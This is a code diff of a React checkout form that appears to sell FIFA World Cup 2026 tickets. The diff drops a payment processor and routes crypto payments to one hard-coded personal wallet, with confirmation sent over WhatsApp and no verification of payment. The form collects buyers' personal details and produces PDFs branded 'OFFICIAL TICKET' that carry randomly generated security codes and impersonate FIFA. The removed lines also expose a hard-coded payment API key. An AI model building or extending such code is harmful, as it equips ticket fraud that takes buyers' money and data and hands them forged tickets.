@@ -1,9 +1,10 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import {
   X, User, Mail, Phone, MapPin, Calendar, Check, Copy,
   ExternalLink, Smartphone, Download, FileText,
-  CreditCard, Shield, Info, DollarSign, Wallet
+  CreditCard, Shield, Info, DollarSign, Wallet, MessageCircle
 } from 'lucide-react';
+import QRCode from 'qrcode';
 import jsPDF from 'jspdf';
 
 interface RegistrationFormProps {
@@ -59,13 +60,26 @@ const countries = [
   'Uzbekistan', 'Vanuatu', 'Vatican City', 'Venezuela', 'Vietnam', 'Yemen', 'Zambia', 'Zimbabwe'
 ];
 
+// عنوان المحفظة الخاص بك
+const WALLET_ADDRESS = '0x62468C025d2738eDB2662B9994F52Af0Afa17c9d';
+const WHATSAPP_NUMBER = '+34632800363';
+
+// العملات الرقمية المدعومة
+const SUPPORTED_CRYPTOS = [
+  { symbol: 'ETH', name: 'Ethereum', network: 'Ethereum' },
+  { symbol: 'USDT', name: 'Tether (ERC-20)', network: 'Ethereum' },
+  { symbol: 'USDC', name: 'USD Coin (ERC-20)', network: 'Ethereum' },
+  { symbol: 'BNB', name: 'BNB (BEP-20)', network: 'BSC' },
+  { symbol: 'MATIC', name: 'Polygon', network: 'Polygon' }
+];
+
 const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ticketInfo }) => {
   const [currentStep, setCurrentStep] = useState(1);
-  const [paymentConfirmed, setPaymentConfirmed] = useState(false);
   const [orderId, setOrderId] = useState('');
-  const [paymentProcessing, setPaymentProcessing] = useState(false);
-  const [paymentUrl, setPaymentUrl] = useState('');
-  const [paymentId, setPaymentId] = useState('');
+  const [qrCodeDataURL, setQrCodeDataURL] = useState('');
+  const [selectedCrypto, setSelectedCrypto] = useState(SUPPORTED_CRYPTOS[0]);
+  const [transactionId, setTransactionId] = useState('');
+  const [copySuccess, setCopySuccess] = useState(false);
   const [formData, setFormData] = useState<FormData>({
     firstName: '',
     lastName: '',
@@ -82,171 +96,97 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
     agreeMarketing: false
   });
 
-  const whatsappNumber = '+34632800363';
-  
-  // NOWPayments API Configuration
-  const NOWPAYMENTS_API_KEY = 'W86THVT-1PCM8V2-MGDQTN0-B3WPJA2';
-  const NOWPAYMENTS_API_URL = 'https://api.nowpayments.io/v1';
-  const WEBHOOK_URL = 'https://www.tixcup.com/api/nowpayments-webhook';
+  // إنشاء QR Code عند تحميل المكون
+  useEffect(() => {
+    const generateQRCode = async () => {
+      try {
+        const qrData = WALLET_ADDRESS;
+        const qrCodeURL = await QRCode.toDataURL(qrData, {
+          width: 256,
+          margin: 2,
+          color: {
+            dark: '#000000',
+            light: '#FFFFFF'
+          }
+        });
+        setQrCodeDataURL(qrCodeURL);
+      } catch (error) {
+        console.error('خطأ في إنشاء QR Code:', error);
+      }
+    };
 
-  // Create crypto payment via NOWPayments API
-  const createCryptoPayment = async () => {
+    if (isOpen) {
+      generateQRCode();
+      const newOrderId = `FIFA2026-${Date.now().toString().slice(-8)}`;
+      setOrderId(newOrderId);
+    }
+  }, [isOpen]);
+
+  // نسخ عنوان المحفظة
+  const copyWalletAddress = async () => {
     try {
-      setPaymentProcessing(true);
-      const orderIdGenerated = `FIFA2026-${Date.now().toString().slice(-8)}`;
-      setOrderId(orderIdGenerated);
-
-      console.log('🚀 Creating NOWPayments payment...');
-
-      const paymentData = {
-        price_amount: ticketInfo.cryptoPrice,
-        price_currency: 'USD',
-        pay_currency: '', // Let user choose crypto
-        order_id: orderIdGenerated,
-        order_description: `FIFA World Cup 2026 - ${ticketInfo.title}`,
-        success_url: `${window.location.origin}?payment=success&order=${orderIdGenerated}`,
-        cancel_url: `${window.location.origin}?payment=cancel&order=${orderIdGenerated}`,
-        ipn_callback_url: WEBHOOK_URL,
-        customer_email: formData.email,
-        is_fixed_rate: false,
-        is_fee_paid_by_user: true
-      };
-
-      console.log('💳 Payment data:', paymentData);
-
-      const response = await fetch(`${NOWPAYMENTS_API_URL}/payment`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-api-key': NOWPAYMENTS_API_KEY
-        },
-        body: JSON.stringify(paymentData)
-      });
-
-      console.log('📡 API Response status:', response.status);
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        console.error('❌ API Error:', errorText);
-        throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
-      }
-
-      const result = await response.json();
-      console.log('✅ Payment created successfully:', result);
-
-      if (result.payment_id) {
-        setPaymentId(result.payment_id);
-        
-        // Use the invoice_url from the response or construct one
-        const invoiceUrl = result.invoice_url || `https://nowpayments.io/payment/?iid=${result.payment_id}`;
-        setPaymentUrl(invoiceUrl);
-
-        console.log('🔗 Opening payment URL:', invoiceUrl);
-
-        // Open payment page in new window
-        const paymentWindow = window.open(
-          invoiceUrl,
-          'nowpayments',
-          'width=800,height=700,scrollbars=yes,resizable=yes,location=yes'
-        );
-
-        if (paymentWindow) {
-          // Start checking payment status
-          checkPaymentStatus(result.payment_id);
-          
-          // Show success message
-          alert(`✅ Payment page opened successfully!\n\nOrder ID: ${orderIdGenerated}\nPayment ID: ${result.payment_id}\n\nPlease complete the payment in the new window.`);
-        } else {
-          alert('❌ Pop-up blocked! Please allow pop-ups and try again.');
-        }
-      } else {
-        throw new Error('No payment_id returned from NOWPayments');
-      }
-
+      await navigator.clipboard.writeText(WALLET_ADDRESS);
+      setCopySuccess(true);
+      setTimeout(() => setCopySuccess(false), 2000);
     } catch (error) {
-      console.error('❌ Error creating payment:', error);
-      alert(
-        `❌ Error creating payment page.\n\n` +
-        `Error: ${error instanceof Error ? error.message : 'Unknown error'}\n` +
-        `Order ID: ${orderId}\n` +
-        `Amount: $${ticketInfo.cryptoPrice}\n\n` +
-        `Please contact us via WhatsApp: ${whatsappNumber}`
-      );
-      setCurrentStep(5); // Go to contact step
-    } finally {
-      setPaymentProcessing(false);
+      console.error('خطأ في النسخ:', error);
+      // Fallback للمتصفحات القديمة
+      const textArea = document.createElement('textarea');
+      textArea.value = WALLET_ADDRESS;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand('copy');
+      document.body.removeChild(textArea);
+      setCopySuccess(true);
+      setTimeout(() => setCopySuccess(false), 2000);
     }
   };
 
-  // Check payment status periodically
-  const checkPaymentStatus = async (paymentIdToCheck: string) => {
-    try {
-      console.log('🔍 Checking payment status for:', paymentIdToCheck);
-      
-      const response = await fetch(`${NOWPAYMENTS_API_URL}/payment/${paymentIdToCheck}`, {
-        method: 'GET',
-        headers: {
-          'x-api-key': NOWPAYMENTS_API_KEY
-        }
-      });
+  // إرسال تأكيد عبر واتساب
+  const sendWhatsAppConfirmation = () => {
+    const message = `🎫 *تأكيد دفع تذاكر كأس العالم FIFA 2026*
 
-      if (response.ok) {
-        const result = await response.json();
-        console.log('📊 Payment status:', result.payment_status);
+📋 *تفاصيل الطلب:*
+• رقم الطلب: ${orderId}
+• الاسم: ${formData.firstName} ${formData.lastName}
+• البريد الإلكتروني: ${formData.email}
+• الهاتف: ${formData.phone}
 
-        // Payment completed successfully
-        if (['finished', 'confirmed'].includes(result.payment_status)) {
-          console.log('✅ Payment confirmed!');
-          setPaymentConfirmed(true);
-          setCurrentStep(5);
-          alert('🎉 Payment confirmed successfully! Your tickets are secured.');
-          return;
-        }
+🎟️ *تفاصيل التذكرة:*
+• النوع: ${ticketInfo.title}
+• السعر الأصلي: $${ticketInfo.price.toLocaleString()}
+• السعر بالعملة الرقمية (خصم 30%): $${ticketInfo.cryptoPrice.toLocaleString()}
 
-        // Payment is still processing
-        if (['waiting', 'confirming', 'sending', 'partially_paid'].includes(result.payment_status)) {
-          console.log('⏳ Payment still processing, checking again in 10 seconds...');
-          setTimeout(() => checkPaymentStatus(paymentIdToCheck), 10000);
-          return;
-        }
+💰 *تفاصيل الدفع:*
+• العملة المختارة: ${selectedCrypto.symbol} (${selectedCrypto.name})
+• الشبكة: ${selectedCrypto.network}
+• عنوان المحفظة: ${WALLET_ADDRESS}
+• المبلغ المدفوع: $${ticketInfo.cryptoPrice.toLocaleString()}
+${transactionId ? `• معرف المعاملة: ${transactionId}` : '• معرف المعاملة: سيتم إضافته'}
 
-        // Payment failed or expired
-        if (['failed', 'expired', 'refunded'].includes(result.payment_status)) {
-          console.log('❌ Payment failed or expired');
-          alert(`❌ Payment ${result.payment_status}. Please try again or contact support.`);
-          return;
-        }
+✅ *تم إرسال الدفع وأنتظر التأكيد*
 
-        // Unknown status, keep checking
-        console.log('❓ Unknown payment status, will check again...');
-        setTimeout(() => checkPaymentStatus(paymentIdToCheck), 15000);
+📞 يرجى تأكيد استلام الدفع وإرسال التذاكر الرسمية.
 
-      } else {
-        console.error('❌ Error checking payment status:', response.status);
-        // Retry after error
-        setTimeout(() => checkPaymentStatus(paymentIdToCheck), 15000);
-      }
-    } catch (error) {
-      console.error('❌ Error checking payment status:', error);
-      // Retry after error
-      setTimeout(() => checkPaymentStatus(paymentIdToCheck), 15000);
-    }
+شكراً لكم! 🙏`;
+
+    const encodedMessage = encodeURIComponent(message);
+    const whatsappURL = `https://wa.me/${WHATSAPP_NUMBER.replace('+', '')}?text=${encodedMessage}`;
+    
+    window.open(whatsappURL, '_blank');
   };
 
-  // Generate FIFA ticket PDF
+  // إنتاج تذكرة PDF
   const generateFIFATicketPDF = () => {
-    const orderIdGenerated = orderId || `FIFA2026-${Date.now().toString().slice(-8)}`;
     const securityCode = Math.random().toString(36).substring(2, 15).toUpperCase();
-    const qrCode = `FIFA2026-${orderIdGenerated}-${securityCode}`;
+    const qrCode = `FIFA2026-${orderId}-${securityCode}`;
 
     const pdf = new jsPDF('p', 'mm', 'a4');
     
-    // Font setup
     pdf.setFont('helvetica');
 
-    // First page - Ticket information
-    // FIFA header
-    pdf.setFillColor(0, 51, 153); // FIFA blue
+    // صفحة أولى - معلومات التذكرة
+    pdf.setFillColor(0, 51, 153);
     pdf.rect(0, 0, 210, 30, 'F');
     
     pdf.setTextColor(255, 255, 255);
@@ -255,7 +195,6 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
     pdf.setFontSize(12);
     pdf.text('OFFICIAL TICKET', 105, 22, { align: 'center' });
 
-    // Ticket information
     pdf.setTextColor(0, 0, 0);
     pdf.setFontSize(16);
     pdf.text('TICKET INFORMATION', 20, 45);
@@ -263,7 +202,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
     pdf.setFontSize(11);
     let yPos = 55;
     
-    pdf.text(`Order ID: ${orderIdGenerated}`, 20, yPos);
+    pdf.text(`Order ID: ${orderId}`, 20, yPos);
     yPos += 8;
     pdf.text(`Event: ${ticketInfo.title}`, 20, yPos);
     yPos += 8;
@@ -271,12 +210,17 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
     yPos += 8;
     pdf.text(`Amount Paid: $${ticketInfo.cryptoPrice} USD`, 20, yPos);
     yPos += 8;
-    pdf.text(`Payment Method: Cryptocurrency`, 20, yPos);
+    pdf.text(`Payment Method: ${selectedCrypto.symbol} (${selectedCrypto.name})`, 20, yPos);
     yPos += 8;
-    pdf.text(`Transaction ID: ${paymentId || 'Processing'}`, 20, yPos);
+    pdf.text(`Wallet Address: ${WALLET_ADDRESS}`, 20, yPos);
+    yPos += 8;
+    if (transactionId) {
+      pdf.text(`Transaction ID: ${transactionId}`, 20, yPos);
+      yPos += 8;
+    }
     yPos += 15;
 
-    // Ticket holder information
+    // معلومات حامل التذكرة
     pdf.setFontSize(16);
     pdf.text('TICKET HOLDER INFORMATION', 20, yPos);
     yPos += 10;
@@ -298,7 +242,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
     }
     yPos += 10;
 
-    // Billing address
+    // عنوان الفوترة
     pdf.setFontSize(16);
     pdf.text('BILLING ADDRESS', 20, yPos);
     yPos += 10;
@@ -316,8 +260,8 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
     }
     yPos += 15;
 
-    // Security information
-    pdf.setFillColor(255, 255, 0); // Yellow
+    // معلومات الأمان
+    pdf.setFillColor(255, 255, 0);
     pdf.rect(15, yPos - 5, 180, 25, 'F');
     
     pdf.setFontSize(14);
@@ -327,15 +271,13 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
     pdf.text(`QR Code: ${qrCode}`, 20, yPos + 18);
     yPos += 35;
 
-    // Issue date
     pdf.setFontSize(10);
     pdf.text(`Issue Date: ${new Date().toLocaleDateString()}`, 20, yPos);
     pdf.text(`Issue Time: ${new Date().toLocaleTimeString()}`, 120, yPos);
 
-    // Second page - Terms and conditions
+    // صفحة ثانية - الشروط والأحكام
     pdf.addPage();
     
-    // Second page header
     pdf.setFillColor(0, 51, 153);
     pdf.rect(0, 0, 210, 25, 'F');
     
@@ -368,7 +310,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
       '• Political banners or flags',
       '',
       'CONTACT INFORMATION:',
-      `• WhatsApp Support: ${whatsappNumber}`,
+      `• WhatsApp Support: ${WHATSAPP_NUMBER}`,
       '• Email: tickets@worldcup2026.com',
       '• Website: www.fifa.com/worldcup2026',
       '',
@@ -398,8 +340,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
       yPos += 6;
     });
 
-    // Save file
-    const fileName = `FIFA_WorldCup_2026_Ticket_${formData.firstName}_${formData.lastName}_${orderIdGenerated}.pdf`;
+    const fileName = `FIFA_WorldCup_2026_Ticket_${formData.firstName}_${formData.lastName}_${orderId}.pdf`;
     pdf.save(fileName);
   };
 
@@ -415,52 +356,52 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
     switch (step) {
       case 1:
         if (!formData.firstName.trim()) {
-          alert('Please enter your first name');
+          alert('يرجى إدخال الاسم الأول');
           return false;
         }
         if (!formData.lastName.trim()) {
-          alert('Please enter your last name');
+          alert('يرجى إدخال اسم العائلة');
           return false;
         }
         if (!formData.email.trim()) {
-          alert('Please enter your email address');
+          alert('يرجى إدخال البريد الإلكتروني');
           return false;
         }
         if (!formData.confirmEmail.trim()) {
-          alert('Please confirm your email address');
+          alert('يرجى تأكيد البريد الإلكتروني');
           return false;
         }
         if (formData.email !== formData.confirmEmail) {
-          alert('Email addresses do not match');
+          alert('البريد الإلكتروني غير متطابق');
           return false;
         }
         if (!formData.phone.trim()) {
-          alert('Please enter your phone number');
+          alert('يرجى إدخال رقم الهاتف');
           return false;
         }
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         if (!emailRegex.test(formData.email)) {
-          alert('Please enter a valid email address');
+          alert('يرجى إدخال بريد إلكتروني صحيح');
           return false;
         }
         return true;
       case 2:
         if (!formData.address.trim()) {
-          alert('Please enter your address');
+          alert('يرجى إدخال العنوان');
           return false;
         }
         if (!formData.city.trim()) {
-          alert('Please enter your city');
+          alert('يرجى إدخال المدينة');
           return false;
         }
         if (!formData.country.trim()) {
-          alert('Please select your country');
+          alert('يرجى اختيار البلد');
           return false;
         }
         return true;
       case 3:
         if (!formData.agreeTerms) {
-          alert('Please agree to the terms and conditions');
+          alert('يرجى الموافقة على الشروط والأحكام');
           return false;
         }
         return true;
@@ -488,7 +429,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
         <div className="flex justify-between items-center p-6 border-b bg-gradient-to-r from-blue-600 to-blue-800 text-white rounded-t-2xl">
           <div>
             <h2 className="text-2xl font-bold">
-              {currentStep === 5 ? '🎉 Payment Confirmed!' : 'Complete Registration'}
+              {currentStep === 5 ? '🎉 جاهز للتحميل!' : 'إكمال التسجيل'}
             </h2>
             <p className="text-blue-200 text-sm">{ticketInfo.title}</p>
           </div>
@@ -504,12 +445,12 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
         {currentStep < 5 && (
           <div className="px-6 py-4 bg-gray-50">
             <div className="flex items-center justify-between mb-2">
-              <span className="text-sm font-medium text-gray-600">Step {currentStep} of 4</span>
+              <span className="text-sm font-medium text-gray-600">الخطوة {currentStep} من 4</span>
               <span className="text-sm text-gray-500">
-                {currentStep === 1 && 'Personal Information'}
-                {currentStep === 2 && 'Address Details'}
-                {currentStep === 3 && 'Terms & Conditions'}
-                {currentStep === 4 && 'NOWPayments Crypto Payment'}
+                {currentStep === 1 && 'المعلومات الشخصية'}
+                {currentStep === 2 && 'تفاصيل العنوان'}
+                {currentStep === 3 && 'الشروط والأحكام'}
+                {currentStep === 4 && 'الدفع بالعملات الرقمية'}
               </span>
             </div>
             <div className="w-full bg-gray-200 rounded-full h-2">
@@ -527,69 +468,69 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
             <div className="space-y-6">
               <div className="text-center mb-6">
                 <User className="h-12 w-12 text-blue-600 mx-auto mb-2" />
-                <h3 className="text-xl font-bold text-gray-800">Personal Information</h3>
-                <p className="text-gray-600">Please provide your personal details</p>
+                <h3 className="text-xl font-bold text-gray-800">المعلومات الشخصية</h3>
+                <p className="text-gray-600">يرجى تقديم بياناتك الشخصية</p>
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">First Name *</label>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">الاسم الأول *</label>
                   <input
                     type="text"
                     name="firstName"
                     value={formData.firstName}
                     onChange={handleInputChange}
                     className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                    placeholder="Enter your first name"
+                    placeholder="أدخل اسمك الأول"
                     required
                   />
                 </div>
                 <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">Last Name *</label>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">اسم العائلة *</label>
                   <input
                     type="text"
                     name="lastName"
                     value={formData.lastName}
                     onChange={handleInputChange}
                     className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                    placeholder="Enter your last name"
+                    placeholder="أدخل اسم العائلة"
                     required
                   />
                 </div>
               </div>
 
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">Email Address *</label>
+                <label className="block text-sm font-medium text-gray-700 mb-2">البريد الإلكتروني *</label>
                 <input
                   type="email"
                   name="email"
                   value={formData.email}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                  placeholder="Enter your email address"
+                  placeholder="أدخل بريدك الإلكتروني"
                   required
                 />
               </div>
 
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">Confirm Email Address *</label>
+                <label className="block text-sm font-medium text-gray-700 mb-2">تأكيد البريد الإلكتروني *</label>
                 <input
                   type="email"
                   name="confirmEmail"
                   value={formData.confirmEmail}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                  placeholder="Confirm your email address"
+                  placeholder="أكد بريدك الإلكتروني"
                   required
                 />
                 {formData.confirmEmail && formData.email !== formData.confirmEmail && (
-                  <p className="text-red-500 text-sm mt-1">Email addresses do not match</p>
+                  <p className="text-red-500 text-sm mt-1">البريد الإلكتروني غير متطابق</p>
                 )}
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number *</label>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">رقم الهاتف *</label>
                   <input
                     type="tel"
                     name="phone"
@@ -601,7 +542,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
                   />
                 </div>
                 <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">Date of Birth</label>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">تاريخ الميلاد</label>
                   <input
                     type="date"
                     name="dateOfBirth"
@@ -613,14 +554,14 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
               </div>
 
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">Nationality</label>
+                <label className="block text-sm font-medium text-gray-700 mb-2">الجنسية</label>
                 <select
                   name="nationality"
                   value={formData.nationality}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                 >
-                  <option value="">Select nationality</option>
+                  <option value="">اختر الجنسية</option>
                   {countries.map((country) => (
                     <option key={country} value={country}>{country}</option>
                   ))}
@@ -634,51 +575,51 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
             <div className="space-y-6">
               <div className="text-center mb-6">
                 <MapPin className="h-12 w-12 text-blue-600 mx-auto mb-2" />
-                <h3 className="text-xl font-bold text-gray-800">Address Information</h3>
-                <p className="text-gray-600">Please provide your address details</p>
+                <h3 className="text-xl font-bold text-gray-800">معلومات العنوان</h3>
+                <p className="text-gray-600">يرجى تقديم تفاصيل عنوانك</p>
               </div>
 
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">Street Address *</label>
+                <label className="block text-sm font-medium text-gray-700 mb-2">عنوان الشارع *</label>
                 <input
                   type="text"
                   name="address"
                   value={formData.address}
                   onChange={handleInputChange}
                   className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                  placeholder="Enter your street address"
+                  placeholder="أدخل عنوان الشارع"
                   required
                 />
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">City *</label>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">المدينة *</label>
                   <input
                     type="text"
                     name="city"
                     value={formData.city}
                     onChange={handleInputChange}
                     className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                    placeholder="Enter your city"
+                    placeholder="أدخل المدينة"
                     required
                   />
                 </div>
                 <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2">Postal Code</label>
+                  <label className="block text-sm font-medium text-gray-700 mb-2">الرمز البريدي</label>
                   <input
                     type="text"
                     name="postalCode"
                     value={formData.postalCode}
                     onChange={handleInputChange}
                     className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                    placeholder="Enter your postal code"
+                    placeholder="أدخل الرمز البريدي"
                   />
                 </div>
               </div>
 
               <div>
-                <label className="block text-sm font-medium text-gray-700 mb-2">Country *</label>
+                <label className="block text-sm font-medium text-gray-700 mb-2">البلد *</label>
                 <select
                   name="country"
                   value={formData.country}
@@ -686,7 +627,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
                   className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                   required
                 >
-                  <option value="">Select country</option>
+                  <option value="">اختر البلد</option>
                   {countries.map((country) => (
                     <option key={country} value={country}>{country}</option>
                   ))}
@@ -700,24 +641,24 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
             <div className="space-y-6">
               <div className="text-center mb-6">
                 <Check className="h-12 w-12 text-blue-600 mx-auto mb-2" />
-                <h3 className="text-xl font-bold text-gray-800">Terms & Conditions</h3>
-                <p className="text-gray-600">Please review and accept our terms</p>
+                <h3 className="text-xl font-bold text-gray-800">الشروط والأحكام</h3>
+                <p className="text-gray-600">يرجى مراجعة وقبول شروطنا</p>
               </div>
 
               {/* Order Summary */}
               <div className="bg-gray-50 rounded-lg p-4 mb-6">
-                <h4 className="font-semibold text-gray-800 mb-2">Order Summary</h4>
+                <h4 className="font-semibold text-gray-800 mb-2">ملخص الطلب</h4>
                 <div className="space-y-2">
                   <div className="flex justify-between items-center">
                     <span className="text-gray-700">{ticketInfo.title}</span>
                     <span className="font-bold text-gray-800">${ticketInfo.price.toLocaleString()}</span>
                   </div>
                   <div className="flex justify-between items-center text-green-600">
-                    <span className="font-semibold">Crypto Payment Discount (30%)</span>
+                    <span className="font-semibold">خصم الدفع بالعملة الرقمية (30%)</span>
                     <span className="font-bold">-${(ticketInfo.price - ticketInfo.cryptoPrice).toLocaleString()}</span>
                   </div>
                   <div className="border-t pt-2 flex justify-between items-center">
-                    <span className="text-lg font-bold text-gray-800">Final Amount</span>
+                    <span className="text-lg font-bold text-gray-800">المبلغ النهائي</span>
                     <span className="text-xl font-bold text-green-600">${ticketInfo.cryptoPrice.toLocaleString()}</span>
                   </div>
                 </div>
@@ -735,7 +676,7 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
                     required
                   />
                   <span className="text-sm text-gray-700">
-                    I agree to the <a href="#" className="text-blue-600 hover:underline">Terms & Conditions</a> and <a href="#" className="text-blue-600 hover:underline">Privacy Policy</a> *
+                    أوافق على <a href="#" className="text-blue-600 hover:underline">الشروط والأحكام</a> و <a href="#" className="text-blue-600 hover:underline">سياسة الخصوصية</a> *
                   </span>
                 </label>
                 <label className="flex items-start space-x-3 cursor-pointer">
@@ -747,124 +688,192 @@ const RegistrationForm: React.FC<RegistrationFormProps> = ({ isOpen, onClose, ti
                     className="mt-1 h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                   />
                   <span className="text-sm text-gray-700">
-                    I would like to receive marketing communications about FIFA World Cup 2026
+                    أرغب في تلقي رسائل تسويقية حول كأس العالم FIFA 2026
                   </span>
                 </label>
               </div>
             </div>
           )}
 
-          {/* Step 4: NOWPayments Crypto Payment */}
+          {/* Step 4: Crypto Payment */}
           {currentStep === 4 && (
             <div className="space-y-6">
               <div className="text-center mb-6">
                 <div className="text-4xl mb-2">💎</div>
-                <h3 className="text-xl font-bold text-gray-800">NOWPayments Crypto Payment</h3>
-                <p className="text-gray-600">Secure cryptocurrency payment via NOWPayments</p>
+                <h3 className="text-xl font-bold text-gray-800">الدفع بالعملات الرقمية</h3>
+                <p className="text-gray-600">ادفع بأمان باستخدام العملات الرقمية</p>
               </div>
 
+              {/* Customer Info Summary */}
               <div className="bg-blue-50 rounded-lg p-4 mb-6">
-                <h4 className="font-semibold text-blue-800 mb-3">Customer Information</h4>
+                <h4 className="font-semibold text-blue-800 mb-3">معلومات العميل</h4>
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm">
-                  <div><strong>Name:</strong> {formData.firstName} {formData.lastName}</div>
-                  <div><strong>Email:</strong> {formData.email}</div>
-                  <div><strong>Phone:</strong> {formData.phone}</div>
-                  <div><strong>Country:</strong> {formData.country}</div>
-                  {formData.nationality && <div><strong>Nationality:</strong> {formData.nationality}</div>}
-                  {formData.dateOfBirth && <div><strong>Date of Birth:</strong> {formData.dateOfBirth}</div>}
+                  <div><strong>الاسم:</strong> {formData.firstName} {formData.lastName}</div>
+                  <div><strong>البريد:</strong> {formData.email}</div>
+                  <div><strong>الهاتف:</strong> {formData.phone}</div>
+                  <div><strong>البلد:</strong> {formData.country}</div>
+                  <div><strong>رقم الطلب:</strong> {orderId}</div>
                 </div>
               </div>
 
-              <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-6">
-                <div className="text-center">
-                  <div className="text-3xl font-bold text-green-600 mb-2">
-                    ${ticketInfo.cryptoPrice.toLocaleString()} USD
-                  </div>
-                  <div className="text-gray-600 mb-4">
-                    (30% crypto payment discount applied)
-                  </div>
-                  <div className="text-sm text-green-700">
-                    Supports 100+ cryptocurrencies: BTC, ETH, USDT, USDC, LTC, BCH and more
-                  </div>
+              {/* Payment Amount */}
+              <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-lg p-6 text-center">
+                <div className="text-3xl font-bold text-green-600 mb-2">
+                  ${ticketInfo.cryptoPrice.toLocaleString()} USD
+                </div>
+                <div className="text-gray-600 mb-4">
+                  (تم تطبيق خصم 30% للدفع بالعملة الرقمية)
                 </div>
               </div>
 
+              {/* Crypto Selection */}
               <div className="space-y-4">
-                <button
-                  onClick={createCryptoPayment}
-                  disabled={paymentProcessing}
-                  className={`w-full font-bold py-4 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 flex items-center justify-center space-x-3 ${
-                    paymentProcessing 
-                      ? 'bg-gray-400 cursor-not-allowed' 
-                      : 'bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white'
-                  }`}
-                >
-                  {paymentProcessing ? (
-                    <>
-                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></div>
-                      <span>Creating NOWPayments invoice...</span>
-                    </>
-                  ) : (
-                    <>
-                      <Wallet className="h-6 w-6" />
-                      <span>Pay ${ticketInfo.cryptoPrice.toLocaleString()} with Crypto</span>
-                    </>
-                  )}
-                </button>
+                <h4 className="font-semibold text-gray-800">اختر العملة الرقمية:</h4>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                  {SUPPORTED_CRYPTOS.map((crypto) => (
+                    <button
+                      key={crypto.symbol}
+                      onClick={() => setSelectedCrypto(crypto)}
+                      className={`p-3 rounded-lg border text-left transition-all duration-200 ${
+                        selectedCrypto.symbol === crypto.symbol
+                          ? 'border-blue-500 bg-blue-50 text-blue-700'
+                          : 'border-gray-200 hover:border-gray-300'
+                      }`}
+                    >
+                      <div className="font-bold">{crypto.symbol}</div>
+                      <div className="text-sm text-gray-600">{crypto.name}</div>
